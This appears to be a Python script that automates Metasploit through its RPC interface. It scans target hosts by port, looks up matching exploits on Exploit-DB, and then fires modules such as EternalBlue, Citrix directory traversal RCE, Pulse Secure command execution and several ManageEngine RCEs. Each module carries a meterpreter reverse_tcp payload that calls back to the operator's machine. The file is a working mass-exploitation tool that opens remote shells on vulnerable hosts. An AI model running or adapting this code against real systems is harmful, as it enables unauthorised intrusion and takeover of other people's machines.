from metasploit_script import *
from json_data_processing_script import *
from web_query_and_process_script import *

import pdb
import socket
import time

####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################

dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
    'RHOSTS': '',
    'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
    'Payload': 'windows/x64/meterpreter/reverse_tcp',
    'LHOST': ''
},
    'windows/smb/ms17_010_eternalblue_win8': {
        'RHOSTS': '',
        'Payload': 'windows/x64/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_jmx_server': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/smb/ms17_010_psexec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_rmi_server': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/misc/java_rmi_server',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_connectionid_write': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_apps_mngr': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/misc/manageengine_eventlog_analyzer_rce': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/phpmyadmin_null_termination_exec': {
        'RHOSTS': '',
        'Payload': 'php/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/manageengine_sd_uploader': {
        'RHOSTS': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/ftp/vermillion_ftpd_port': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_appmanager_exec': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/struts_dmi_rest_exec': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOSTS':''
    },
    ############################################TOP EXPLOIT 2016-2020 USA############################################
    'linux/http/pulse_secure_cmd_exec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/gather/pulse_secure_file_disclosure',
        'Payload': 'linux/x64/meterpreter_reverse_tcp',
        'LHOSTS': ''
    },
    'linux/http/citrix_dir_traversal_rce': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/http/citrix_dir_traversal',
        'Payload': 'python/meterpreter/reverse_tcp',
        'LHOSTS': ''
    }

}

###################################################DICTIONNARY CONFIG SCAN##############################################
dictionnary_config_scanner = {
    '21': {
        'auxiliary/scanner/ftp/ftp_version': {
            'RHOSTS': '',
            'To_get': 'FTP Banner'
        },
        'auxiliary/scanner/ftp/anonymous': {
            'RHOSTS': '',
            'To_get': 'Anonymous READ'
        }

    },
    '22': {
        'auxiliary/scanner/ssh/ssh_version': {
            'RHOSTS': '',
            'To_get': 'version',
            'Info': 'mind if the version is lower than 7.7, you can try to enumerate the user with a user_file.txt'
        }
    },
    '25': {
        'auxiliary/scanner/smtp/smtp_version': {
            'RHOSTS': '',
            'To_get': 'version',
            'Info': 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service'
        }
    },
    '161': {
        'auxiliary/scanner/snmp/snmp_login': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'Successful'

        },
        'auxiliary/scanner/snmp/snmp_enum': {
            'RHOSTS': '',
            'THREADS': '255',
            'COMMUNITY': '',
            'To_get': 'data',

        }
    },
    '445': {
        'scanner/smb/smb_version': {
            'RHOSTS': '',
            'To_get': 'running',
            'Info': 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service ; also, if the systeme is linux, try exploit/linux/samba/is_known_pipename'
        },
        'auxiliary/scanner/smb/smb_ms17_010': {
            'RHOSTS': '',
            'To_get': 'data'
        },
    },
    '3306': {
        'auxiliary/scanner/mysql/mysql_version': {
            'RHOSTS': '',
            'To_get': 'MySQL'
        }

    },
    '111': {
        'auxiliary/scanner/nfs/nfsmount': {
            'RHOSTS': '',
            'To_get': 'NFS',
            'Info': 'mind you might be able to mount the disk of the remote machine thanks to user@ubuntu# mount -t nfs @ip:path_according_to_scan_result /path_in_your_machine'
        }
    },
    '3389': {
        'auxiliary/scanner/rdp/cve_2019_0708_bluekeep': {
            'RHOSTS': '',
            'To_get': 'vulnerable'
        }
    },
    '5900': {
        'auxiliary/scanner/vnc/vnc_none_auth': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'data'
        }
    },
    '23': {
        'auxiliary/scanner/telnet/telnet_version': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'TELNET'
        },
        'auxiliary/scanner/telnet/telnet_encrypt_overflow': {
            'RHOSTS': '',
            'THREADS': '255',
            'To_get': 'VULNERABLE'
        },

    }

}

#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
############################################AUTO SCAN/EXPLOIT PORT PART#################################################
#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000


#####################################################AUTO SCAN PART#####################################################
def script_automate_scan():
    '''

    @return: list data from the metasploit console, the rpc client and the console associated to this client
    '''
    # flag 161 type access
    flag_161_access = ''

    # dictionnary of data
    dict_of_ip = {}
    dict_of_data = {}
    dict_tmp = {}

    # check ip_port vulnerability
    dict_port_ip_vuln = look_for_port()

    # launch metasploit
    client, console = main_connection()

    if client == -1:
        return -1

    #######################################CHECK OPENED PORT####################################
    for ip, liste_port_vuln in dict_port_ip_vuln.items():
        liste_port_vuln.append('161')  ##TRICK FOR 161 DUE TO THE FACT THAT 161 MIGHTS RESPOND EVEN IF IT IS CLOSED
        ################LOOK UPON DICTIONNARY SCANNER##################
        for port_num in [*dictionnary_config_scanner]:
            if port_num in liste_port_vuln:
                dico_port_num = dictionnary_config_scanner[port_num]
                for scanner in [*dico_port_num]:
                    #############ENTER THE SCANNER IN THE CONSOLE AND CONFIGURE IT###############
                    # pdb.set_trace()
                    console.write('use ' + scanner)
                    time.sleep(1)
                    dico_scanner = dico_port_num[scanner]
                    # print(scanner)
                    for arg, value in dico_scanner.items():
                        if arg == 'RHOSTS':
                            console.write('set RHOSTS ' + str(ip))
                            time.sleep(1)
                        if arg == 'THREADS':
                            console.write('set THREADS ' + value)
                            time.sleep(1)
                        if arg == 'COMMUNITY':
                            if flag_161_access == 'true private':
                                console.write('set COMMUNITY private')
                            else:
                                console.write('set COMMUNITY public')
                            time.sleep(1)
                    # pdb.set_trace()
                    ############RUN THE SCANNER##############
                    console.write('run')
                    time.sleep(1)  #######forced to slow down the process due to rpc latency :(
                    while console.is_busy() == True:
                        time.sleep(3)  #######same as the above commentary
                    #############GET THE DATA#############
                    data_version = console.read()
                    # pdb.set_trace()
                    version = 'None'
                    ######IF ALL DATA IS DESIRED###########
                    if dico_scanner['To_get'] == 'data':
                        dict_tmp[scanner] = data_version['data']
                    ####LOOK FOR 161 CONNEXION POSSIBILITY###"
                    elif scanner == 'auxiliary/scanner/snmp/snmp_login' and 'private' in data_version['data']:
                        flag_161_access = 'true private'
                    #####GET SPECIFIED DATA IN THE ATTRIBUTE 'To_get' OF THE DICTIONNARY OF THE SCANNER CONFIG#####
                    elif dico_scanner['To_get'] in data_version['data']:
                        spliter = data_version['data'].split('\n')
                        for line in spliter:
                            if dico_scanner['To_get'] in line:
                                version = line
                        dict_tmp[scanner] = version
                    ####IF NOTHING WAS FOUND#####
                    elif version == 'None':
                        dict_tmp[scanner] = version
                    try:
                        dict_tmp['info'] = dico_scanner['Info']
                    except:
                        a = None
                print(dict_tmp)
                dict_of_data[port_num] = dict_tmp
                # RESET DICT TMP
                dict_tmp = {}

        dict_of_ip[ip] = dict_of_data
        # RESET DICT DATA
        dict_of_data = {}

    return dict_of_ip


###############################################AUTO RUN EXPLOIT PART####################################################
# def script_automate_exploit(data_read_out, client, console):
#     '''
#
#     @param data_read_out: list data from the metasploit console
#     @param client: client rpc
#     @param console: console associated to the client rpc
#     @return: rpc client with the created sessions for this client
#     '''
#     # check opened port
#     opened_vuln_port, ip_vuln = look_for_port()
#     ip_vuln_reconf = []
#
#     # test with putting an unexploitable
#
#     ####################################GET IP HOSTNAME#########################################
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     s.connect(("8.8.8.8", 80))
#     hostname = s.getsockname()[0]
#     s.close()
#
#     # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
#     for data in data_read_out:
#         for ip in ip_vuln:
#             if ip[0] in data and ip[0] not in ip_vuln_reconf:
#                 ip_vuln_reconf.append(ip[0])
#
#     for str_data in data_read_out:
#         if 'eternalblue' in str_data:
#             #######################################CONFIG EXPLOIT####################################
#             auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
#             exploit_name = 'windows/smb/ms17_010_eternalblue'
#
#             #####################################GET EXPLOIT########################################
#
#             exploit = main_run_exploit(exploit_name, client)
#
#             #######################################CONFIG OPTIONS AND PAYLOAD#######################
#
#             running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
#
#             payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
#             main_config_payload('LHOST', hostname, 'STR', payload)
#
#             for ip in ip_vuln_reconf:
#                 main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
#                 main_exe_exploit(payload, exploit, client)
#
#             print(client.sessions.list)
#             sessions_created = client.sessions.list
#             return client, sessions_created
#
#     return client, -1

#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
###############################################EXPLOIT-DB PART##########################################################
#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

###############################################EXPLOIT-DB SEARCH########################################################
def get_board_exploit(client):
    # pdb.set_trace()
    board_of_exploit = {}
    tmp = {}
    list_of_ip = look_for_ip_of_nmap_scan()
    for ip in list_of_ip:
        data = get_port_id_and_name(ip)  # json script
        print(data, '\n')
        data2 = create_requete_for_exploitdb(data)  # json script
        print(data2, '\n')
        data3 = improve_research(data2)  # json script
        print(data3, '\n')
        for port, query in data3.items():
            table = exploitdb_query(query)  # query script
            output_rows = retrieve_from_html_exploitdb(table)  # query script
            exploit = retrieve_exploit_from_db_info(output_rows, client)  # metasploit_script
            if exploit != -1:
                tmp[port] = exploit
        board_of_exploit[str(ip)] = tmp
    return board_of_exploit


def brute_force_exploit(board_of_exploit, client):
    # !!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
    ####global variable####
    global session_key_client

    ###########VARIABLES FOR THIS DEFINITION##############
    session_key_client = None

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    for ip in [*board_of_exploit]:
        for port, list_of_exploit in board_of_exploit[ip].items():
            for exploit in list_of_exploit:
                if exploit in [*dictionnary_config_exploit]:
                    dico_config = dictionnary_config_exploit[exploit]
                    #############################################CONFIG EXPLOIT###################################
                    exploit_running = main_run_exploit(exploit, client)
                    payload = None
                    for arg, value in dico_config.items():
                        if arg == 'RHOSTS':
                            main_change_option_exploit(arg, ip, 'STR', exploit_running)
                        if arg == 'CheckModule':
                            main_change_option_exploit(arg, dico_config[arg], 'STR', exploit_running)
                        if arg == 'RPORT':
                            main_change_option_exploit(arg, port, 'STR', exploit_running)
                        if arg == 'Payload':
                            payload = main_choose_payload(dico_config[arg], client)
                        if arg == 'LHOST' and payload is not None:
                            main_config_payload(arg, hostname, 'STR', payload)
                        # print(exploit_running.runoptions)
                    ############################################RUN EXPLOIT######################################
                    # pdb.set_trace()
                    if payload is not None:
                        json_exploit, session = main_exe_exploit(payload, exploit_running, client)

    return client.sessions.list


########################################################TEST PART#######################################################
# client, console = main_connection()
# # print(get_board_exploit(client))
# board = {
#    "172.16.1.2":{
#       "445":[
#          "windows/smb/ms17_010_eternalblue",
#          "windows/smb/ms17_010_eternalblue_win8",
#          "windows/smb/ms17_010_psexec"
#       ],
#       "1617":[
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions",
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server"
#       ],
#       "8022":[
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server",
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions"
#       ],
#       "8032":[
#          "multi/http/manageengine_auth_upload",
#          "multi/http/manageengine_sd_uploader",
#          "multi/http/manageengine_search_sqli",
#          "windows/http/manageengine_adshacluster_rce",
#          "windows/http/manageengine_appmanager_exec",
#          "windows/http/manageengine_apps_mngr",
#          "windows/http/manageengine_connectionid_write",
#          "windows/misc/manageengine_eventlog_analyzer_rce"
#       ],
#       "8282":[
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server",
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions"
#       ],
#       "8444":[
#          "multi/http/manageengine_auth_upload",
#          "multi/http/manageengine_sd_uploader",
#          "multi/http/manageengine_search_sqli",
#          "windows/http/manageengine_adshacluster_rce",
#          "windows/http/manageengine_appmanager_exec",
#          "windows/http/manageengine_apps_mngr",
#          "windows/http/manageengine_connectionid_write",
#          "windows/misc/manageengine_eventlog_analyzer_rce"
#       ],
#       "49182":[
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions",
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server"
#       ]
#    }
# }
# print(brute_force_exploit(board, client))
#
#
# # print(script_automate_scan())
